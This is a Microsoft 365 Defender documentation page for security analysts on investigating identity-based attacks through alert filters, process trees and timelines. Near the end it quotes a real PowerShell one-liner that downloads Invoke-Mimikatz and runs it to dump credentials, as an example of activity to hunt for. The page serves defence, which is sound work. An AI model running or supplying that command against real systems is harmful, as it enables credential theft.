---
title: Other investigation paths-Identity-based attacks
description: Other investigation paths-Identity-based attacks.
keywords: incidents, alerts, investigate, correlation, attack, machines, devices, users, identities, identity, mailbox, email, 365, microsoft, m365
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords: 
  - NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection: 
  - M365-security-compliance
  - m365initiative-m365-defender
ms.topic: conceptual
search.appverid: 
  - MOE150
  - MET150
ms.technology: m365d
---
# Other investigation paths-Identity-based attacks

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Applies to:**
- Microsoft 365 Defender

Microsoft Defender for Identity can help detect malicious attempts to compromise entities in your organization. Since Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.

## Investigating the attack in Microsoft Defender for Identity

Microsoft 365 Defender allows analysts to filter alerts by detection source on the alerts tab of the incidents page. In the following example, the detection source is filtered to Defender for Identity. 

<!--
ADD FIGURE
--> 

Selecting the **Suspected overpass-the-hash attack** alert brings you to a page in Microsoft Cloud App Security that displays more detailed information. Analysts can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.
 

## Investigating the same attack in Microsoft Defender for Endpoint

Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint. Select the incident from the incidents list, then select the Alerts tab. From here, you can identify the detection source as well. A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint. From here select an alert detected by EDR.

<!--
ADD FIGURE
-->  

The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details. The alert story depicts a visual representation of the process tree. The process tree is a hierarchical representation of parent and child processes related to the alert.

<!--
ADD FIGURE
--> 

Each process can be expanded to view additional details. Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.

<!--
ADD FIGURE
--> 
 
By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise. 

Microsoft Defender for Endpoint can detect many malicious files and scripts. However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity. Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity. 

To do this an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started. 

<!--
ADD FIGURE
--> 

It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity. One way to accomplish this is by using timeline filters. There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view. 

In the image below, the analyst filtered to view only network and process events. This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree. 

<!--
ADD FIGURE
--> 

In this particular event, Notepad was used to make a malicious outbound connection. However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.

Another item to look for in the timeline would be PowerShell uses for outbound connections. The analyst would look for successful PowerShell connections via commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file. 

In the following example, PowerShell was used to download and execute Mimikatz from a website:

```powershell
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds”
```

An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with Powershell. 

## Next step

See the [phishing](first-incident-path-phishing.md) investigation path.

## See also

- [Incidents overview](incidents-overview.md)
- [Manage incidents](manage-incidents.md)
- [Analyze incidents](investigate-incidents.md)
